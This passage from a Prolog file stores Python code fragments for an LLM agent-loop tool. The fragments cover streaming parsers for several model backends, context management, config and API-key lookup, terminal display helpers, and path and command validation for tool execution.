py_fragment(list_models_api, '    def list_models(self) -> list[str]:
        """List available models on the Ollama server."""
        try:
            url = f"{self.base_url}/api/tags"
            req = urllib.request.Request(url, method="GET")

            with urllib.request.urlopen(req, timeout=10) as response:
                result = json.loads(response.read().decode(\'utf-8\'))

            return [m["name"] for m in result.get("models", [])]

        except Exception:
            return []
').

%% --- Fragment: Stream-JSON parser (gemini variant) ---

py_fragment(stream_json_parser_gemini, '            content_parts = []
            tokens = {}
            tool_count = 0
            last_tool_desc = None

            for line in proc.stdout:
                line = line.strip()
                if not line or not line.startswith(\'{\'):
                    continue

                try:
                    event = json.loads(line)
                except json.JSONDecodeError:
                    continue

                etype = event.get(\'type\', \'\')

                if etype == \'message\' and event.get(\'role\') == \'assistant\':
                    text = event.get(\'content\', \'\')
                    content_parts.append(text)

                elif etype == \'tool_use\':
                    tool_count += 1
                    tool_name = event.get(\'tool_name\', \'?\')
                    params = event.get(\'parameters\', {})
                    last_tool_desc = self._describe_tool_call(tool_name, params)
                    if self._on_status:
                        self._on_status(f"[{tool_count}] {last_tool_desc}")

                elif etype == \'tool_result\':
                    status = event.get(\'status\', \'\')
                    if self._on_status:
                        self._on_status(f"[{tool_count}] {last_tool_desc} done ({status})")

                elif etype == \'result\':
                    stats = event.get(\'stats\', {})
                    tokens = {
                        \'input\': stats.get(\'input_tokens\', 0),
                        \'output\': stats.get(\'output_tokens\', 0),
                    }

            proc.wait(timeout=10)
            content = \'\'.join(content_parts).strip()

            if not content and proc.returncode != 0:
                stderr = proc.stderr.read()
                content = f"[Error: {stderr.strip()}]"
').

%% --- Fragment: Stream-JSON parser (claude_code variant) ---

py_fragment(stream_json_parser_claude_code, '            content_parts = []
            tokens = {}
            tool_count = 0
            last_tool_desc = None

            for line in proc.stdout:
                line = line.strip()
                if not line or not line.startswith(\'{\'):
                    continue

                try:
                    event = json.loads(line)
                except json.JSONDecodeError:
                    continue

                etype = event.get(\'type\', \'\')

                if etype == \'assistant\':
                    # Assistant messages contain content blocks
                    message_data = event.get(\'message\', {})
                    content_blocks = message_data.get(\'content\', [])

                    for block in content_blocks:
                        btype = block.get(\'type\', \'\')

                        if btype == \'text\':
                            content_parts.append(block.get(\'text\', \'\'))

                        elif btype == \'tool_use\':
                            tool_count += 1
                            tool_name = block.get(\'name\', \'?\')
                            tool_input = block.get(\'input\', {})
                            last_tool_desc = self._describe_tool_call(tool_name, tool_input)
                            if self._on_status:
                                self._on_status(f"[{tool_count}] {last_tool_desc}")

                elif etype == \'user\':
                    # Tool result \u2014 include tool description so it\'s visible
                    if self._on_status and tool_count > 0:
                        self._on_status(f"[{tool_count}] {last_tool_desc} done")

                elif etype == \'result\':
                    # Final result with usage stats
                    usage = event.get(\'usage\', {})
                    tokens = {
                        \'input\': usage.get(\'input_tokens\', 0),
                        \'output\': usage.get(\'output_tokens\', 0),
                    }
                    cache_read = usage.get(\'cache_read_input_tokens\', 0)
                    cache_create = usage.get(\'cache_creation_input_tokens\', 0)
                    if cache_read:
                        tokens[\'cache_read\'] = cache_read
                    if cache_create:
                        tokens[\'cache_create\'] = cache_create

                    # Use result text if we didn\'t collect content from events
                    if not content_parts:
                        result_text = event.get(\'result\', \'\')
                        if result_text:
                            content_parts.append(result_text)

            proc.wait(timeout=10)
            content = \'\'.join(content_parts).strip()

            if not content and proc.returncode != 0:
                stderr = proc.stderr.read()
                content = f"[Error: {stderr.strip()}]"
').

%% --- Fragment: Popen setup for CLI stream-json ---

py_fragment(popen_setup, '            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                stdin=subprocess.DEVNULL
            )

').

%% --- Fragment: Stream-JSON return ---

py_fragment(stream_json_return, '        return AgentResponse(
            content=content,
            tool_calls=[],
            tokens=tokens,
        )
').

%% --- Fragment: SSE streaming (openrouter) ---

py_fragment(sse_streaming_openrouter, '    def send_message_streaming(self, message: str, context: list[dict],
                               on_token=None, **kwargs) -> AgentResponse:
        """Send message with SSE streaming. Tokens arrive via on_token callback."""
        # Build messages array (same as non-streaming)
        messages = [{"role": "system", "content": self.system_prompt}]
        for msg in context:
            role = msg.get(\'role\')
            if role == \'tool\':
                messages.append({
                    "role": "tool",
                    "tool_call_id": msg.get(\'tool_call_id\', \'\'),
                    "content": msg[\'content\'],
                })
            elif role == \'assistant\' and msg.get(\'tool_calls\'):
                messages.append({
                    "role": "assistant",
                    "content": msg.get(\'content\') or \'\',
                    "tool_calls": msg[\'tool_calls\'],
                })
            elif role in (\'user\', \'assistant\'):
                messages.append({"role": role, "content": msg[\'content\']})
        if message and (not context or context[-1].get(\'content\') != message):
            messages.append({"role": "user", "content": message})

        # Build request body with stream=True
        body = {
            "model": self.model,
            "messages": messages,
            "max_tokens": self.max_tokens,
            "temperature": self.temperature,
            "stream": True,
        }
        if self.tool_schemas:
            body["tools"] = self.tool_schemas
            body["tool_choice"] = "auto"

        url = f"{self.base_url.rstrip(\'/\')}/chat/completions"
        req = Request(
            url,
            data=json.dumps(body).encode(\'utf-8\'),
            headers={
                \'Content-Type\': \'application/json\',
                \'Authorization\': f\'Bearer {self.api_key}\',
                \'HTTP-Referer\': \'https://github.com/s243a/UnifyWeaver\',
                \'X-Title\': \'UnifyWeaver Agent Loop\',
            },
            method=\'POST\'
        )

        content = ""
        tool_calls_acc = {}  # index -> {id, name, arguments}
        tokens = {}

        try:
            with urlopen(req, timeout=300) as resp:
                for raw_line in resp:
                    line = raw_line.decode(\'utf-8\', errors=\'replace\').rstrip(\'\\n\\r\')
                    if not line.startswith(\'data: \'):
                        continue
                    payload = line[6:]
                    if payload == \'[DONE]\':
                        break
                    try:
                        chunk = json.loads(payload)
                    except json.JSONDecodeError:
                        continue

                    choices = chunk.get(\'choices\', [])
                    if not choices:
                        # Usage-only chunk (some providers send this)
                        if chunk.get(\'usage\'):
                            usage = chunk[\'usage\']
                            tokens = {
                                \'input\': usage.get(\'prompt_tokens\', 0),
                                \'output\': usage.get(\'completion_tokens\', 0),
                                \'total\': usage.get(\'total_tokens\', 0),
                            }
                        continue

                    delta = choices[0].get(\'delta\', {})

                    # Text content
                    text = delta.get(\'content\')
                    if text:
                        content += text
                        if on_token:
                            on_token(text)

                    # Tool call deltas \u2014 accumulate by index
                    for tc_delta in delta.get(\'tool_calls\', []):
                        idx = tc_delta.get(\'index\', 0)
                        if idx not in tool_calls_acc:
                            tool_calls_acc[idx] = {
                                \'id\': \'\', \'name\': \'\', \'arguments\': \'\'
                            }
                        acc = tool_calls_acc[idx]
                        if tc_delta.get(\'id\'):
                            acc[\'id\'] = tc_delta[\'id\']
                        func = tc_delta.get(\'function\', {})
                        if func.get(\'name\'):
                            acc[\'name\'] = func[\'name\']
                        if func.get(\'arguments\'):
                            acc[\'arguments\'] += func[\'arguments\']

                    # Usage in final chunk
                    if chunk.get(\'usage\'):
                        usage = chunk[\'usage\']
                        tokens = {
                            \'input\': usage.get(\'prompt_tokens\', 0),
                            \'output\': usage.get(\'completion_tokens\', 0),
                            \'total\': usage.get(\'total_tokens\', 0),
                        }

        except HTTPError as e:
            error_body = e.read().decode(\'utf-8\', errors=\'replace\')
            try:
                err_data = json.loads(error_body)
                err_msg = err_data.get(\'error\', {}).get(\'message\', error_body[:200])
            except json.JSONDecodeError:
                err_msg = error_body[:200]
            return AgentResponse(content=f"[API Error {e.code}: {err_msg}]", tokens={})
        except URLError as e:
            return AgentResponse(content=f"[Network Error: {e.reason}]", tokens={})
        except Exception as e:
            return AgentResponse(content=f"[Error: {e}]", tokens={})

        # Convert accumulated tool call deltas to ToolCall objects
        tool_calls = []
        for acc in tool_calls_acc.values():
            try:
                arguments = json.loads(acc[\'arguments\']) if acc[\'arguments\'] else {}
            except json.JSONDecodeError:
                arguments = {"raw": acc[\'arguments\']}
            tool_calls.append(ToolCall(
                name=acc[\'name\'],
                arguments=arguments,
                id=acc[\'id\']
            ))

        return AgentResponse(
            content=content,
            tool_calls=tool_calls,
            tokens=tokens,
        )
').

%% =============================================================================
%% Fragments: context.py
%% =============================================================================

py_fragment(context_helpers, '
def _count_words(text: str) -> int:
    """Count words in text."""
    return len(text.split())


def _estimate_tokens(text: str) -> int:
    """Estimate token count from text (chars / 4 heuristic)."""
    return max(1, len(text) // 4)
').

py_fragment(context_manager_class, 'class ContextManager:
    """Manages conversation history and context window."""

    def __init__(
        self,
        max_tokens: int = 100000,
        max_messages: int = 50,
        max_chars: int = 0,
        max_words: int = 0,
        behavior: ContextBehavior = ContextBehavior.CONTINUE,
        format: ContextFormat = ContextFormat.PLAIN
    ):
        self.messages: list[Message] = []
        self.max_tokens = max_tokens
        self.max_messages = max_messages
        self.max_chars = max_chars
        self.max_words = max_words
        self.behavior = behavior
        self.format = format
        self._token_count = 0
        self._char_count = 0
        self._word_count = 0

    def add_message(self, role: str, content: str, tokens: int = 0,
                    tool_call_id: str = "", tool_calls: list | None = None) -> None:
        """Add a message to the context."""
        if tokens == 0:
            tokens = _estimate_tokens(content)

        msg = Message(role=role, content=content, tokens=tokens,
                      tool_call_id=tool_call_id,
                      tool_calls=tool_calls or [])
        self.messages.append(msg)
        self._token_count += tokens
        self._char_count += len(content)
        self._word_count += _count_words(content)
        self._trim_if_needed()

    def _trim_if_needed(self) -> None:
        """Remove old messages if any context limit is exceeded."""
        while len(self.messages) > self.max_messages:
            self._remove_oldest()

        while self._token_count > self.max_tokens and len(self.messages) > 1:
            self._remove_oldest()

        if self.max_chars > 0:
            while self._char_count > self.max_chars and len(self.messages) > 1:
                self._remove_oldest()

        if self.max_words > 0:
            while self._word_count > self.max_words and len(self.messages) > 1:
                self._remove_oldest()

    def _remove_oldest(self) -> None:
        """Remove the oldest message and update counters."""
        removed = self.messages.pop(0)
        self._token_count -= removed.tokens
        self._char_count -= len(removed.content)
        self._word_count -= _count_words(removed.content)

    @staticmethod
    def _msg_to_dict(msg: \'Message\') -> dict:
        """Convert a Message to a dict, including tool fields when present."""
        d = {"role": msg.role, "content": msg.content}
        if msg.role == \'tool\' and msg.tool_call_id:
            d["tool_call_id"] = msg.tool_call_id
        if msg.role == \'assistant\' and msg.tool_calls:
            d["tool_calls"] = msg.tool_calls
        return d

    def get_context(self) -> list[dict]:
        """Get context formatted for the backend."""
        if self.behavior == ContextBehavior.FRESH:
            return []

        messages = self.messages
        if self.behavior == ContextBehavior.SLIDING:
            messages = self.messages[-self.max_messages:]

        if self.max_chars <= 0 and self.max_words <= 0:
            return [self._msg_to_dict(msg) for msg in messages]

        result = []
        total_chars = 0
        total_words = 0
        for msg in reversed(messages):
            msg_chars = len(msg.content)
            msg_words = _count_words(msg.content)

            if self.max_chars > 0 and total_chars + msg_chars > self.max_chars and result:
                break
            if self.max_words > 0 and total_words + msg_words > self.max_words and result:
                break

            result.append(self._msg_to_dict(msg))
            total_chars += msg_chars
            total_words += msg_words

        result.reverse()
        return result

    def get_formatted_context(self) -> str:
        """Get context as a formatted string."""
        context = self.get_context()

        if self.format == ContextFormat.PLAIN:
            return self._format_plain(context)
        elif self.format == ContextFormat.MARKDOWN:
            return self._format_markdown(context)
        elif self.format == ContextFormat.JSON:
            return self._format_json(context)
        elif self.format == ContextFormat.XML:
            return self._format_xml(context)

        return self._format_plain(context)

    def _format_plain(self, context: list[dict]) -> str:
        """Format context as plain text."""
        lines = []
        for msg in context:
            role = "User" if msg["role"] == "user" else "Assistant"
            lines.append(f"{role}: {msg[\'content\']}")
        return "\\n".join(lines)

    def _format_markdown(self, context: list[dict]) -> str:
        """Format context as markdown."""
        lines = []
        for msg in context:
            role = "User" if msg["role"] == "user" else "Assistant"
            lines.append(f"**{role}:**\\n{msg[\'content\']}\\n")
        return "\\n".join(lines)

    def _format_json(self, context: list[dict]) -> str:
        """Format context as JSON."""
        import json
        return json.dumps(context, indent=2)

    def _format_xml(self, context: list[dict]) -> str:
        """Format context as XML."""
        lines = ["<conversation>"]
        for msg in context:
            lines.append(f\'  <message role="{msg["role"]}">\'  )
            lines.append(f"    {msg[\'content\']}")
            lines.append("  </message>")
        lines.append("</conversation>")
        return "\\n".join(lines)

    def clear(self) -> None:
        """Clear all messages from context."""
        self.messages.clear()
        self._token_count = 0
        self._char_count = 0
        self._word_count = 0

    @property
    def token_count(self) -> int:
        """Current total token count."""
        return self._token_count

    @property
    def char_count(self) -> int:
        """Current total character count."""
        return self._char_count

    @property
    def word_count(self) -> int:
        """Current total word count."""
        return self._word_count

    @property
    def message_count(self) -> int:
        """Current message count."""
        return len(self.messages)

    def __len__(self) -> int:
        return len(self.messages)
').

%% =============================================================================
%% Fragments: config.py
%% =============================================================================

%% config_read_cascade fragment deleted — now generated from config_search_path/3 facts

py_fragment(config_resolve_api_key_header, '
def resolve_api_key(backend_type: str, cli_key: str | None = None,
                    no_fallback: bool = False) -> str | None:
    """Resolve API key with full priority chain."""
    if cli_key:
        return cli_key

').

py_fragment(config_resolve_api_key_middle, '    env_var = env_vars.get(backend_type)
    if env_var:
        val = os.environ.get(env_var)
        if val:
            return val

    config = read_config_cascade(no_fallback)
    provider_key = config.get(\'keys\', {}).get(backend_type)
    if provider_key:
        return provider_key
    if config.get(\'api_key\'):
        return config[\'api_key\']

').

py_fragment(config_resolve_api_key_footer, '    loc = file_locations.get(backend_type)
    if loc:
        path = os.path.expanduser(loc)
        try:
            with open(path) as f:
                return f.read().strip()
        except FileNotFoundError:
            pass

    return None

').

py_fragment(config_resolve_env_var, 'def _resolve_env_var(value: str) -> str:
    """Resolve environment variable references like $VAR or ${VAR}."""
    if not isinstance(value, str):
        return value
    if value.startswith(\'$\'):
        var_name = value[1:]
        if var_name.startswith(\'{\') and var_name.endswith(\'}\'):
            var_name = var_name[1:-1]
        return os.environ.get(var_name, value)
    return value

').

%% _load_agent_config is now generated from agent_config_field/4 + config_field_json_default/2

py_fragment(config_load_config, '

def load_config(path: str | Path) -> Config:
    """Load configuration from a YAML or JSON file."""
    path = Path(path)

    if not path.exists():
        raise FileNotFoundError(f"Config file not found: {path}")

    content = path.read_text()

    if path.suffix in (\'.yaml\', \'.yml\'):
        if not HAS_YAML:
            raise ImportError("PyYAML not installed. Use JSON config or: pip install pyyaml")
        data = yaml.safe_load(content)
    else:
        data = json.loads(content)

    config = Config(
        default=data.get(\'default\', \'default\'),
        config_dir=str(path.parent),
        skills_dir=data.get(\'skills_dir\', \'\')
    )

    for name, agent_data in data.get(\'agents\', {}).items():
        config.agents[name] = _load_agent_config(name, agent_data)

    if \'default\' not in config.agents:
        config.agents[\'default\'] = AgentConfig(name=\'default\', backend=\'coro\')

    return config

').

%% load_config_from_dir is now generated from config_dir_file_name/1 facts

py_fragment(config_load_from_dir_footer, '        config_path = dir_path / name
        if config_path.exists():
            return load_config(config_path)

    return None
').

py_fragment(config_save_example_tail, '
    if path.suffix in (\'.yaml\', \'.yml\'):
        if not HAS_YAML:
            raise ImportError("PyYAML not installed for YAML output")
        content = yaml.dump(example, default_flow_style=False, sort_keys=False)
    else:
        content = json.dumps(example, indent=2)

    path.write_text(content)
').

%% =============================================================================
%% Fragments: display.py (mostly imperative, single large fragment)
%% =============================================================================

py_fragment(display_module, '"""Display module using tput for Termux-compatible terminal control."""

import os
import subprocess
import sys
import threading
import time
from typing import Optional


def _get_tput_sequence(cap: str) -> str:
    """Get escape sequence for a terminfo capability."""
    try:
        result = subprocess.run(
            [\'tput\', cap],
            capture_output=True,
            text=True,
            timeout=1
        )
        return result.stdout
    except Exception:
        return \'\'


_SEQUENCES = {
    \'cr\': \'\\r\',
    \'el\': _get_tput_sequence(\'el\'),
    \'civis\': _get_tput_sequence(\'civis\'),
    \'cnorm\': _get_tput_sequence(\'cnorm\'),
    \'sc\': _get_tput_sequence(\'sc\'),
    \'rc\': _get_tput_sequence(\'rc\'),
}


def tput_write(cap: str) -> None:
    """Write cached tput sequence to stdout."""
    seq = _SEQUENCES.get(cap, \'\')
    if seq:
        os.write(sys.stdout.fileno(), seq.encode())


class TerminalControl:
    """Terminal control using tput commands."""

    @staticmethod
    def cr() -> None:
        tput_write(\'cr\')

    @staticmethod
    def el() -> None:
        tput_write(\'el\')

    @staticmethod
    def clear_line() -> None:
        tput_write(\'cr\')
        tput_write(\'el\')

    @staticmethod
    def save_cursor() -> None:
        tput_write(\'sc\')

    @staticmethod
    def restore_cursor() -> None:
        tput_write(\'rc\')

    @staticmethod
    def hide_cursor() -> None:
        tput_write(\'civis\')

    @staticmethod
    def show_cursor() -> None:
        tput_write(\'cnorm\')

    @staticmethod
    def move_up(n: int = 1) -> None:
        os.write(sys.stdout.fileno(), f"\\033[{n}A".encode())

    @staticmethod
    def move_down(n: int = 1) -> None:
        os.write(sys.stdout.fileno(), f"\\033[{n}B".encode())

    @staticmethod
    def cols() -> int:
        try:
            result = subprocess.run([\'tput\', \'cols\'], capture_output=True, text=True, timeout=1)
            return int(result.stdout.strip() or \'80\')
        except (ValueError, Exception):
            return 80

    @staticmethod
    def lines() -> int:
        try:
            result = subprocess.run([\'tput\', \'lines\'], capture_output=True, text=True, timeout=1)
            return int(result.stdout.strip() or \'24\')
        except (ValueError, Exception):
            return 24


class Spinner:
    """Animated spinner that updates in place using tput."""

    FRAMES = [\'\\u280b\', \'\\u2819\', \'\\u2839\', \'\\u2838\', \'\\u283c\', \'\\u2834\', \'\\u2826\', \'\\u2827\', \'\\u2807\', \'\\u280f\']
    INTERVAL = 0.1

    def __init__(self, message: str = "Working"):
        self.message = message
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._frame = 0
        self._tc = TerminalControl()
        self._cols = self._tc.cols()
        self._lock = threading.Lock()
        self._start_time = 0.0

    def _truncate(self, text: str, width: int) -> str:
        max_len = width - 2
        if len(text) > max_len:
            return text[:max_len - 3] + \'...\'
        return text

    def _animate(self) -> None:
        self._tc.hide_cursor()
        try:
            while self._running:
                with self._lock:
                    elapsed = time.time() - self._start_time
                    elapsed_str = f" ({elapsed:.0f}s)" if elapsed >= 2 else ""
                    frame = self.FRAMES[self._frame % len(self.FRAMES)]
                    display = self._truncate(
                        self.message + elapsed_str, self._cols
                    )
                    self._tc.clear_line()
                    sys.stdout.write(f"{frame} {display}")
                    sys.stdout.flush()
                    self._frame += 1
                time.sleep(self.INTERVAL)
        finally:
            self._tc.show_cursor()

    def start(self) -> None:
        if self._running:
            return
        self._start_time = time.time()
        self._running = True
        self._thread = threading.Thread(target=self._animate, daemon=True)
        self._thread.start()

    def stop(self, final_message: Optional[str] = None) -> None:
        self._running = False
        if self._thread:
            self._thread.join(timeout=0.5)
            self._thread = None

        with self._lock:
            self._tc.clear_line()
            sys.stdout.write(f"  {self.message}\\n")
            if final_message:
                sys.stdout.write(final_message + \'\\n\')
            sys.stdout.flush()

    def update(self, message: str) -> None:
        with self._lock:
            if message != self.message:
                self._tc.clear_line()
                sys.stdout.write(f"  {self.message}\\n")
                sys.stdout.flush()
                self.message = message

    def __enter__(self) -> \'Spinner\':
        self.start()
        return self

    def __exit__(self, *args) -> None:
        self.stop()


class ProgressBar:
    """Progress bar for streaming that updates in place."""

    def __init__(self, total: int = 100, width: int = 30,
                 prefix: str = "", suffix: str = ""):
        self.total = total
        self.width = width
        self.prefix = prefix
        self.suffix = suffix
        self.current = 0
        self._tc = TerminalControl()

    def update(self, current: Optional[int] = None,
               increment: int = 0, suffix: str = None) -> None:
        if current is not None:
            self.current = current
        else:
            self.current += increment

        if suffix is not None:
            self.suffix = suffix

        self._render()

    def _render(self) -> None:
        if self.total <= 0:
            pct = 0
        else:
            pct = min(100, int(100 * self.current / self.total))

        filled = int(self.width * pct / 100)
        bar = \'\\u2588\' * filled + \'\\u2591\' * (self.width - filled)

        self._tc.clear_line()
        sys.stdout.write(f"{self.prefix}[{bar}] {pct}% {self.suffix}")
        sys.stdout.flush()

    def finish(self, message: str = "") -> None:
        self.current = self.total
        self._render()
        sys.stdout.write(\'\\n\')
        if message:
            sys.stdout.write(message + \'\\n\')
        sys.stdout.flush()


class StatusLine:
    """Status line at the bottom of the terminal."""

    def __init__(self):
        self._tc = TerminalControl()
        self._saved = False
        self._status = ""

    def show(self, status: str) -> None:
        self._status = status
        self._tc.clear_line()
        cols = self._tc.cols()
        if len(status) > cols - 1:
            status = status[:cols - 4] + \'...\'
        sys.stdout.write(status)
        sys.stdout.flush()

    def clear(self) -> None:
        self._tc.clear_line()
        sys.stdout.flush()
        self._status = ""

    def update(self, status: str) -> None:
        self.show(status)


class StreamDisplay:
    """Display for streaming output with progress indication."""

    def __init__(self, show_tokens: bool = True):
        self.show_tokens = show_tokens
        self._tc = TerminalControl()
        self._char_count = 0
        self._line_count = 0

    def start(self, label: str = "Streaming") -> None:
        sys.stdout.write(f"\\n{label}:\\n")
        sys.stdout.flush()
        self._char_count = 0
        self._line_count = 0

    def chunk(self, text: str) -> None:
        sys.stdout.write(text)
        sys.stdout.flush()
        self._char_count += len(text)
        self._line_count += text.count(\'\\n\')

    def finish(self, tokens: Optional[dict] = None) -> None:
        sys.stdout.write(\'\\n\')
        if self.show_tokens and tokens:
            input_t = tokens.get(\'input\', 0)
            output_t = tokens.get(\'output\', 0)
            sys.stdout.write(f"  [Tokens: input={input_t}, output={output_t}]\\n")
        sys.stdout.flush()


class DisplayMode:
    """Factory for display components based on mode."""

    APPEND_ONLY = \'append\'
    NCURSES = \'ncurses\'

    @classmethod
    def supports_ncurses(cls) -> bool:
        return bool(_SEQUENCES.get(\'el\'))

    @classmethod
    def get_spinner(cls, message: str, mode: str = None) -> \'Spinner\':
        if mode is None:
            mode = cls.NCURSES if cls.supports_ncurses() else cls.APPEND_ONLY

        if mode == cls.APPEND_ONLY:
            return AppendOnlySpinner(message)
        return Spinner(message)

    @classmethod
    def get_progress(cls, total: int, mode: str = None, **kwargs) -> \'ProgressBar\':
        if mode is None:
            mode = cls.NCURSES if cls.supports_ncurses() else cls.APPEND_ONLY

        if mode == cls.APPEND_ONLY:
            return AppendOnlyProgress(total, **kwargs)
        return ProgressBar(total, **kwargs)


class AppendOnlySpinner:
    """Fallback spinner for append-only mode."""

    def __init__(self, message: str = "Working"):
        self.message = message
        self._running = False
        self._thread: Optional[threading.Thread] = None

    def _animate(self) -> None:
        count = 0
        while self._running:
            if count % 10 == 0:
                sys.stdout.write(\'.\')
                sys.stdout.flush()
            count += 1
            time.sleep(0.1)

    def start(self) -> None:
        if self._running:
            return
        sys.stdout.write(f"[{self.message}]")
        sys.stdout.flush()
        self._running = True
        self._thread = threading.Thread(target=self._animate, daemon=True)
        self._thread.start()

    def stop(self, final_message: Optional[str] = None) -> None:
        self._running = False
        if self._thread:
            self._thread.join(timeout=0.5)
            self._thread = None

        if final_message:
            sys.stdout.write(f" {final_message}\\n")
        else:
            sys.stdout.write(" done\\n")
        sys.stdout.flush()

    def update(self, message: str) -> None:
        pass

    def __enter__(self) -> \'AppendOnlySpinner\':
        self.start()
        return self

    def __exit__(self, *args) -> None:
        self.stop()


class AppendOnlyProgress:
    """Fallback progress bar for append-only mode."""

    def __init__(self, total: int = 100, width: int = 30,
                 prefix: str = "", suffix: str = ""):
        self.total = total
        self.prefix = prefix
        self._last_pct = -1

    def update(self, current: Optional[int] = None,
               increment: int = 0, suffix: str = None) -> None:
        if current is None:
            current = increment

        if self.total <= 0:
            return

        pct = min(100, int(100 * current / self.total))
        milestone = (pct // 25) * 25
        if milestone > self._last_pct:
            sys.stdout.write(f"[{milestone}%]")
            sys.stdout.flush()
            self._last_pct = milestone

    def finish(self, message: str = "") -> None:
        if self._last_pct < 100:
            sys.stdout.write("[100%]")
        sys.stdout.write(f" {message}\\n" if message else "\\n")
        sys.stdout.flush()
').

%% =============================================================================
%% Fragments: tools.py
%% =============================================================================

py_fragment(tools_validate_path, 'def validate_path(raw_path: str, working_dir: str,
                  extra_blocked: list[str] | None = None,
                  extra_allowed: list[str] | None = None) -> tuple[str, str | None]:
    """Resolve and validate a file path.

    Returns (resolved_path, error_message).
    error_message is None if the path is safe.
    """
    if raw_path.startswith(\'/\'):
        resolved = os.path.realpath(raw_path)
    else:
        resolved = os.path.realpath(os.path.join(working_dir, raw_path))

    raw_abs = os.path.abspath(os.path.join(working_dir, raw_path)) if not raw_path.startswith(\'/\') else raw_path
    check_paths = {resolved, raw_abs}

    if extra_allowed:
        for pattern in extra_allowed:
            expanded = os.path.realpath(os.path.expanduser(pattern))
            for p in check_paths:
                if p == expanded or p.startswith(expanded.rstrip(\'/\') + \'/\'):
                    return resolved, None

    if extra_blocked:
        for pattern in extra_blocked:
            expanded = os.path.realpath(os.path.expanduser(pattern))
            for p in check_paths:
                if p == expanded or p.startswith(expanded.rstrip(\'/\') + \'/\'):
                    return resolved, f"Blocked by config: {raw_path}"

    for p in check_paths:
        if p in _BLOCKED_PATHS:
            return resolved, f"Blocked: {raw_path} is a sensitive system file"
        for prefix in _BLOCKED_PREFIXES:
            if p.startswith(prefix):
                return resolved, f"Blocked: {raw_path} is in a system directory"

    home = os.path.expanduser(\'~\')
    for p in check_paths:
        if p.startswith(home + \'/\'):
            rel = p[len(home) + 1:]
            for pattern in _BLOCKED_HOME_PATTERNS:
                if rel == pattern.rstrip(\'/\') or rel.startswith(pattern):
                    return resolved, f"Blocked: ~/{pattern} may contain credentials"

    return resolved, None
').

py_fragment(tools_is_command_blocked, 'def is_command_blocked(command: str,
                       extra_blocked: list[str] | None = None,
                       extra_allowed: list[str] | None = None) -> str | None:
    """Return reason if command is blocked, None if allowed."""
    if extra_allowed:
        for pattern in extra_allowed:
            if re.search(pattern, command, re.IGNORECASE):
                return None

    if extra_blocked:
        for pattern in extra_blocked:
            if re.search(pattern, command, re.IGNORECASE):
                return f"Blocked by config: matches \'{pattern}\'"

    for pattern, description in _BLOCKED_COMMAND_PATTERNS:
        if re.search(pattern, command, re.IGNORECASE):
            return f"Blocked: {description}"
    return None
').

py_fragment(tools_security_config, '# ── Security config ────────────────────────────────────────────────────────

@dataclass
class SecurityConfig:
    """Security settings for tool execution."""
    path_validation: bool = True
    command_blocklist: bool = True
    blocked_paths: list[str] = field(default_factory=list)
    blocked_commands: list[str] = field(default_factory=list)
    allowed_paths: list[str] = field(default_factory=list)
    allowed_commands: list[str] = field(default_factory=list)

    allowed_commands_only: bool = False
    safe_commands: list[str] = field(default_factory=list)
    command_proxying: str = \'disabled\'
    max_file_read_size: int | None = None
    max_file_write_size: int | None = None

    path_proxying: bool = False
    proot_sandbox: bool = False
    proot_allowed_dirs: list[str] = field(default_factory=list)

    @classmethod
    def from_profile(cls, profile: str) -> \'SecurityConfig\':
        """Create config from a named security profile."""
        sp = get_profile(profile)
        return cls(
            path_validation=sp.path_validation,
            command_blocklist=sp.command_blocklist,
            blocked_paths=list(sp.blocked_paths),
            blocked_commands=list(sp.blocked_commands),
            allowed_paths=list(sp.allowed_paths),
            allowed_commands=list(sp.allowed_commands),
            allowed_commands_only=sp.allowed_commands_only,
            safe_commands=list(sp.safe_commands),
            command_proxying=sp.command_proxying,
            max_file_read_size=sp.max_file_read_size,
            max_file_write_size=sp.max_file_write_size,
            path_proxying=sp.path_proxying,
            proot_sandbox=sp.proot_isolation,
            proot_allowed_dirs=list(sp.proot_allowed_dirs),
        )
').

py_fragment(tools_handler_class_header, 'class ToolHandler:
    """Handles execution of tool calls from agent responses."""

    def __init__(
        self,
        allowed_tools: list[str] | None = None,
        confirm_destructive: bool = True,
        working_dir: str | None = None,
        security: SecurityConfig | None = None,
        audit: AuditLogger | None = None
    ):
        self.allowed_tools = allowed_tools or {{default_tools}}
        self.confirm_destructive = confirm_destructive
        self.working_dir = working_dir or os.getcwd()
        self.security = security or SecurityConfig()
        self.audit = audit or AuditLogger(level=\'disabled\')

        self.proxy: CommandProxyManager | None = None
        if self.security.command_proxying != \'disabled\':
            self.proxy = CommandProxyManager()

        self.path_proxy = None
        if self.security.path_proxying:
            from security.path_proxy import PathProxyManager
            self.path_proxy = PathProxyManager()
            if self.proxy:
                generated = self.path_proxy.generate_wrappers(self.proxy)
                if generated:
                    self.audit.log_proxy_action(
                        \'\', \'path_proxy\', \'init\',
                        f\'Generated wrappers: {", ".join(generated)}\')

        self.proot = None
        if self.security.proot_sandbox:
            from security.proot_sandbox import ProotSandbox, ProotConfig
            proot_cfg = ProotConfig(
                allowed_dirs=self.security.proot_allowed_dirs)
            sandbox = ProotSandbox(self.working_dir, proot_cfg)
            if sandbox.is_available():
                self.proot = sandbox
            else:
                import sys
                print("[Warning] proot sandbox requested but proot not "
                      "found. Install with: pkg install proot",
                      file=sys.stderr)
').

py_fragment(tools_handler_class_body, '
    def execute(self, tool_call: ToolCall) -> ToolResult:
        """Execute a tool call and return the result."""
        if tool_call.name not in self.allowed_tools:
            return ToolResult(
                success=False,
                output=f"Tool \'{tool_call.name}\' is not allowed",
                tool_name=tool_call.name
            )

        if tool_call.name not in self.tools:
            return ToolResult(
                success=False,
                output=f"Unknown tool: {tool_call.name}",
                tool_name=tool_call.name
            )

        if tool_call.name == \'bash\':
            blocked = self._pre_check_bash(tool_call.arguments)
            if blocked:
                self.audit.log_tool_call(
                    tool_call.name, False,
                    args_summary=str(tool_call.arguments)[:256]
                )
                return blocked

        if self.confirm_destructive and tool_call.name in self.destructive_tools:
            if not self._is_safe_command(tool_call):
                if not self._confirm_execution(tool_call):
                    return ToolResult(
                        success=False,
                        output="User declined to execute tool",
                        tool_name=tool_call.name
                    )

        try:
            result = self.tools[tool_call.name](tool_call.arguments)
            self.audit.log_tool_call(
                tool_call.name, result.success,
                args_summary=str(tool_call.arguments)[:256]
            )
            return result
        except Exception as e:
            self.audit.log_tool_call(tool_call.name, False, args_summary=str(e))
            return ToolResult(
                success=False,
                output=f"Error executing {tool_call.name}: {e}",
                tool_name=tool_call.name
            )

    def _confirm_execution(self, tool_call: ToolCall) -> bool:
